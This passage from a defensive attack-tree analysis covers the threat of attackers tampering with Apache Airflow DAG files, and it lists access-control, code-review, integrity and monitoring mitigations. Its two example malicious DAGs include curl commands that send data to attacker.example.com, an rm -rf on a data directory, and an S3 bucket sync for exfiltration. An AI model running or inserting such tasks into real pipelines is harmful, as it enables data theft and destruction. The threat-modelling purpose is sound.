*   **Enhance Security Awareness:**  Provide the development team with a clear understanding of the risks associated with insecure DAG management practices.

### 2. Scope

This analysis is focused specifically on the provided attack tree path:

**2. Manipulate DAG Scheduling (via DAG Storage/Version Control) [HIGH-RISK PATH START]:**

*   **Modify DAG Definitions (if attacker gains access to DAG storage or version control) [HIGH-RISK PATH START]:**
    *   **Inject malicious tasks into existing DAGs [HIGH-RISK PATH CONTINUES]:**

### 4. Deep Analysis of Attack Tree Path

#### 2. Manipulate DAG Scheduling (via DAG Storage/Version Control) [HIGH-RISK PATH START]

This high-risk path highlights the critical dependency of Airflow's scheduling mechanism on the integrity and security of DAG definitions stored in DAG storage or version control systems.  Compromising these storage locations allows attackers to manipulate the very core of Airflow's workflow execution.

##### * Modify DAG Definitions (if attacker gains access to DAG storage or version control) [HIGH-RISK PATH START]

This is the pivotal step in this attack path.  Successful modification of DAG definitions grants the attacker significant control over Airflow's operations.  The prerequisite is unauthorized access to the storage location of DAG files. This storage could be:

*   **Shared Filesystem:** A network share accessible by the Airflow scheduler and potentially other systems.
*   **Git Repository:** A version control system used to manage DAG code.
*   **Cloud Storage (e.g., AWS S3, Google Cloud Storage, Azure Blob Storage):** Cloud-based object storage used for DAG persistence.

**Attack Vector:**  Attacker gains unauthorized access to the storage location of DAG files (e.g., shared filesystem, Git repository) or the version control system used for DAG management.

**How Access Might Be Gained:**

*   **Compromised Credentials:**  Stolen or weak credentials for accounts with write access to the DAG storage. This could be SSH keys, API keys, or filesystem credentials.
*   **Vulnerability Exploitation:** Exploiting vulnerabilities in the storage system itself (e.g., insecure filesystem permissions, vulnerabilities in Git server software, misconfigured cloud storage buckets).
*   **Insider Threat:** Malicious actions by an authorized user with access to DAG storage.
*   **Lateral Movement:**  After gaining initial access to another system in the network, the attacker moves laterally to access the DAG storage location.

Once access is gained, the attacker can proceed with the following sub-paths:

#####     * Inject malicious tasks into existing DAGs [HIGH-RISK PATH CONTINUES]

**Attack Vector:** Attacker modifies existing DAG files to insert malicious tasks. These tasks can execute arbitrary code within the Airflow environment when the DAG runs.

**Technical Details:**

*   The attacker needs to understand Python and the structure of Airflow DAGs.
*   They will modify existing DAG Python files, adding new Python code within Task definitions (e.g., PythonOperator, BashOperator).
*   The injected code can perform any action that the Airflow worker process has permissions to execute.

**Example Malicious Task (PythonOperator):**

```python
from airflow import DAG
from airflow.operators.python_operator import PythonOperator
from datetime import datetime

def malicious_function():
    import subprocess
    subprocess.run(["curl", "-X", "POST", "-d", "@exfiltrate_data.json", "https://attacker.example.com/data_sink"]) # Exfiltrate data
    subprocess.run(["rm", "-rf", "/important/data/directory"]) # Data deletion
    print("Malicious code executed!")

with DAG(
    dag_id='example_dag',
    start_date=datetime(2023, 1, 1),
    schedule_interval=None,
    catchup=False
) as dag:
    task1 = PythonOperator(
        task_id='task_one',
        python_callable=print,
        op_args=['This is task one']
    )

    malicious_task = PythonOperator( # Injected malicious task
        task_id='malicious_task',
        python_callable=malicious_function
    )

    task2 = PythonOperator(
        task_id='task_two',
        python_callable=print,
        op_args=['This is task two']
    )

    task1 >> malicious_task >> task2
```

**Impact:**

*   **Remote Code Execution (RCE):** The injected tasks execute arbitrary code on the Airflow worker nodes.
*   **Data Manipulation:**  Malicious code can modify data within databases, data lakes, or other systems accessed by Airflow.
*   **Data Exfiltration:** Sensitive data can be extracted and sent to attacker-controlled servers.
*   **Disruption of Workflows:**  Malicious tasks can disrupt legitimate data pipelines, causing failures, delays, or incorrect data processing.
*   **Compromise of Infrastructure:**  Depending on the permissions of the Airflow worker process, the attacker could potentially escalate privileges or compromise other systems within the infrastructure.

**Mitigation:**

*   **Strict Access Control to DAG Storage (Preventative):**
    *   **Principle of Least Privilege:** Grant only necessary users and services write access to DAG storage.
    *   **Authentication and Authorization:** Implement strong authentication mechanisms (e.g., SSH keys, API keys, IAM roles) and robust authorization policies to control access.
    *   **Network Segmentation:** Isolate DAG storage within a secure network segment, limiting network access.
    *   **Regular Access Reviews:** Periodically review and revoke unnecessary access permissions.

*   **Version Control with Code Review Processes for DAG Changes (Preventative & Detective):**
    *   **Mandatory Version Control (Git):** Enforce the use of version control (e.g., Git) for all DAG modifications.
    *   **Code Review Workflow:** Implement a mandatory code review process for all DAG changes before they are merged or deployed. This allows for human inspection and detection of malicious code.
    *   **Branch Protection:** Utilize branch protection features in Git to prevent direct pushes to main branches and enforce code review requirements.

*   **Immutable DAG Storage (Preventative - where feasible):**
    *   **Read-Only Deployment:**  Deploy DAGs to a read-only storage location after initial deployment. This prevents direct modification in place.
    *   **Immutable Infrastructure:**  Consider using immutable infrastructure principles where DAG deployments are treated as immutable artifacts.

*   **DAG Integrity Checks (Detective):**
    *   **Hashing/Checksums:** Generate cryptographic hashes (e.g., SHA256) of DAG files and store them securely. Regularly verify the integrity of DAG files by comparing their current hashes against the stored hashes.
    *   **Digital Signatures:** Digitally sign DAG files using a trusted key. Verify the signatures before DAG parsing and execution to ensure authenticity and integrity.

*   **Monitoring and Alerting (Detective & Corrective):**
    *   **DAG Change Monitoring:** Implement monitoring to detect any modifications to DAG files in storage. Alert on unauthorized changes.
    *   **Anomaly Detection:** Monitor Airflow task execution patterns for anomalies that might indicate malicious activity (e.g., unexpected tasks, unusual resource consumption).
    *   **Security Information and Event Management (SIEM):** Integrate Airflow logs and security events into a SIEM system for centralized monitoring and alerting.

#####     * Replace legitimate DAGs with malicious ones [HIGH-RISK PATH CONTINUES]

**Attack Vector:** Attacker replaces legitimate DAG files with completely malicious DAGs. These malicious DAGs can execute arbitrary code and perform malicious actions when scheduled.

**Technical Details:**

*   Instead of modifying existing DAGs, the attacker completely replaces the content of DAG files with their own malicious DAG definitions.
*   This is a more direct and potentially more impactful attack, as the attacker has full control over the entire workflow defined in the replaced DAG.
*   The malicious DAG can be designed to execute immediately upon being parsed by the Airflow scheduler or to wait for its scheduled execution time.

**Example Malicious DAG (Replacing a legitimate DAG):**

```python
from airflow import DAG
from airflow.operators.bash_operator import BashOperator
from datetime import datetime

with DAG(
    dag_id='legitimate_dag_name', # Replaces an existing DAG with this name
    start_date=datetime(2023, 1, 1),
    schedule_interval='@daily',
    catchup=False
) as dag:
    malicious_task = BashOperator(
        task_id='malicious_bash_task',
        bash_command='aws s3 sync s3://sensitive-data-bucket /tmp/data && curl -X POST -d "@data.zip" https://attacker.example.com/data_sink' # Exfiltrate S3 bucket
    )
```

**Impact:**

*   **Complete Control over Airflow Workflows:** The attacker gains full control over the workflows defined by the replaced DAGs.
*   **Data Manipulation and Exfiltration:**  Malicious DAGs can be designed to target specific data sources, manipulate data, and exfiltrate sensitive information.
*   **Disruption of Operations:**  Replacing critical DAGs can severely disrupt business operations that rely on Airflow workflows.
*   **Wider System Compromise:**  Malicious DAGs can be used as a launchpad to attack other systems and services accessible from the Airflow environment.

**Mitigation:**

The mitigations for replacing DAGs are largely the same as for injecting malicious tasks, but with an even stronger emphasis on detection and integrity:

*   **Strict Access Control to DAG Storage (Preventative):**  (Same as above - critical to prevent unauthorized replacement)
*   **Version Control with Code Review Processes for DAG Changes (Preventative & Detective):** (Same as above - code review should compare the entire DAG content, not just incremental changes)
*   **DAG Integrity Checks (Detective - Crucial):**
    *   **Hashing/Checksums:**  Regularly verify DAG file hashes against a known good baseline.  Alert immediately if a hash mismatch is detected, indicating a DAG replacement.
    *   **Digital Signatures:**  Digitally sign DAGs and verify signatures upon loading.
*   **Monitoring and Alerting (Detective & Corrective - Enhanced):**
    *   **DAG Definition Monitoring:**  Monitor for changes in DAG definitions, not just file modifications.  Compare DAG structures and task definitions against a known good state.
    *   **DAG Parsing Errors:**  Monitor for DAG parsing errors after DAG storage modifications.  A sudden increase in parsing errors could indicate malicious DAGs that are syntactically incorrect or intentionally designed to cause errors.
    *   **Unusual DAG Activity:**  Monitor for the execution of unexpected DAGs or DAGs with unusual names.
*   **Separation of Duties (Preventative):**
    *   **Separate DAG Development and Deployment Roles:**  Implement separation of duties where different teams or individuals are responsible for developing DAGs and deploying/managing them in production. This reduces the risk of a single compromised account leading to malicious DAG deployment.

### 5. Conclusion

The "Manipulate DAG Scheduling (via DAG Storage/Version Control)" attack path represents a significant threat to Airflow environments.  Successful exploitation can lead to severe consequences, including data breaches, operational disruption, and infrastructure compromise.

Implementing robust security measures focused on access control, version control, integrity checks, and continuous monitoring is crucial to mitigate these risks.  A layered security approach, combining preventative and detective controls, is essential to protect Airflow deployments from malicious DAG manipulation attacks.  Regular security assessments and awareness training for development and operations teams are also vital components of a comprehensive security strategy.
